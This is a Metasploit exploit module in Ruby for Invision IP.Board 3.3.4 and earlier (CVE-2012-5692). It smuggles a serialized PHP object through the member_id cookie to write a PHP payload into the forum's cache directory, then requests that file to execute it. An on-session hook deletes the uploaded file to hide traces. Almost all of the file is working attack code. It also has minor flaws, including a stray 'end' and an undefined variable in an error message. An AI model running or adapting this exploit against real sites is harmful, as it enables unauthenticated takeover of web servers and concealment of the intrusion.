# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
# Original: http://1337day.com/exploit/description/19670
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Invision IP.Board <= 3.3.4 unserialize() PHP Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a php unserialize() vulnerability in Invision IP.Board
                <= 3.3.4 which could be abused to allow unauthenticated users to execute arbitrary
                code under the context of the webserver user.
 
                The dangerous unserialize() exists in the &#039;/admin/sources/base/core.php&#039; script,
                which is called with user controlled data from the cookie. The exploit abuses the
                __destruct() method from the dbMain class to write arbitrary PHP code to a file on
                the Invision IP.Board web directory.
 
                The exploit has been tested successfully on Invision IP.Board 3.3.4.
            },
            &#039;Author&#039;    =>
                [
                    &#039;EgiX&#039;,         # Vulnerability discovery and PoC
                    &#039;juan vazquez&#039;, # Metasploit module
                    &#039;sinn3r&#039;        # PhpEXE tekniq & check() method
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-5692&#039; ],
                    [ &#039;OSVDB&#039;, &#039;86702&#039; ],
                    [ &#039;BID&#039;, &#039;56288&#039; ],
                    [ &#039;EDB&#039;, &#039;22398&#039; ],
                    [ &#039;URL&#039;, &#039;http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-critical-security-update/&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 8000, #Apache&#039;s limit for GET
                    &#039;DisableNops&#039; => true
                },
            &#039;Targets&#039;        => [ [&#039;Invision IP.Board 3.3.4&#039;, {}] ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Oct 25 2012&#039;
            ))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [ true, "The base path to the web application", "/forums/"])
            ], self.class)
    end
 
    def base
        base = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
        return base
    end
 
    def check
        res = send_request_raw({&#039;uri&#039;=>"#{base}index.php"})
        return Exploit::CheckCode::Unknown if not res
 
        version = res.body.scan(/Community Forum Software by IP\.Board (\d+)\.(\d+).(\d+)/).flatten
        version = version.map {|e| e.to_i}
 
        # We only want major version 3
        # This version checking is based on OSVDB&#039;s info
        return Exploit::CheckCode::Safe if version[0] != 3
 
        case version[1]
        when 1
            return Exploit::CheckCode::Vulnerable if version[2].between?(0, 4)
        when 2
            return Exploit::CheckCode::Vulnerable if version[2].between?(0, 3)
        when 3
            return Exploit::CheckCode::Vulnerable if version[2].between?(0, 4)
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def on_new_session(client)
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            begin
                print_warning("#{@peer} - Deleting #{@upload_php}")
                client.fs.file.rm(@upload_php)
                print_good("#{@peer} - #{@upload_php} removed to stay ninja")
            rescue
                print_error("#{@peer} - Unable to remove #{f}")
            end
        end
    end
 
    def exploit
        @upload_php = rand_text_alpha(rand(4) + 4) + ".php"
        @peer = "#{rhost}:#{rport}"
 
        # get_write_exec_payload uses a function, which limits our ability to support
        # Linux payloads, because that requires a space:
        #   function my_cmd
        # becomes:
        #   functionmy_cmd #Causes parsing error
        # We&#039;ll have to address that in the mixin, and then come back to this module
        # again later.
        php_payload = get_write_exec_payload(:unlink_self=>true)
        php_payload = php_payload.gsub(/^\<\?php/, &#039;<?&#039;)
        php_payload = php_payload.gsub(/ /,&#039;&#039;)
 
        db_driver_mysql = "a:1:{i:0;O:15:\"db_driver_mysql\":1:{s:3:\"obj\";a:2:{s:13:\"use_debug_log\";i:1;s:9:\"debug_log\";s:#{"cache/#{@upload_php}".length}:\"cache/#{@upload_php}\";}}}"
 
        print_status("#{@peer} - Exploiting the unserialize() to upload PHP code")
 
        res = send_request_cgi(
        {
            &#039;uri&#039; => "#{base}index.php?#{php_payload}",
            &#039;method&#039; => &#039;GET&#039;,
            &#039;cookie&#039; => "member_id=#{Rex::Text.uri_encode(db_driver_mysql)}"
        })
 
        if not res or res.code != 200
            print_error("#{@peer} - Exploit failed: #{res.code}")
            return
        end
 
        print_status("#{@peer} - Executing the payload #{@upload_php}")
 
        res = send_request_raw({&#039;uri&#039; => "#{base}cache/#{@upload_php}"})
 
        if res
            print_error("#{@peer} - Payload execution failed: #{res.code}")
            return
        end
 
    end
end

